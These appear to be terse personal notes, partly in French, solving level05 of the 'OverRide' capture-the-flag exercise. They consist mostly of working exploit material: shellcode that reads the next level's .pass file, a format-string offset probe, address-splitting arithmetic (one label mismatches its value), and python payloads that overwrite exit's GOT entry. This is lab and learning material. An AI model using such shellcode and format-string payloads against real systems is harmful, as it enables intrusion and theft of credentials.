export exploit=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'


exit    | 0x8048370
        | 0x80497e0

exploit : 0xffffdec6 | 0xffffded0 || 0xffffdf0b | 0xffffdf15
decallage de 10

level05@OverRide:~$ ./level05
DDDD  %x %x %x %x %x %x %x %x %x %x %x %x %x
dddd  64 f7fcfac0 f7ec3add ffffd68f ffffd68e 0 ffffffff ffffd714 f7fdb000 64646464 78252020 20782520 25207825

octets poids faible : 0xdec6 = 57030 - 8 = 57022
octets poids faible : 0xded0 = 57040 - 8 = 57032

octets poids faible : 0xdf0b = 57099 - 8 = 57091
octets poids faible : 0xded0 = 57109 - 8 = 57101


octets poids fort : 0xffff = 65535 - 57022 = 8513
octets poids fort : 0xffff = 65535 - 57032 = 8503

octets poids fort : 0xffff = 65535 - 57091 = 8444
octets poids fort : 0xffff = 65535 - 57101 = 8434

octets poids fort : 0xffff = 65535 - 57109 = 8426

python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57022x" + "%10$hn" + "%8513x" + "%11$hn"' | ./level05
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57032x" + "%10$hn" + "%8503x" + "%11$hn"' | ./level05
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57091x" + "%10$hn" + "%8444x" + "%11$hn"' | ./level05
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57101x" + "%10$hn" + "%8434x" + "%11$hn"' | ./level05

python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57101x" + "%10$hn" + "%8434x" + "%11$hn"' | ./level05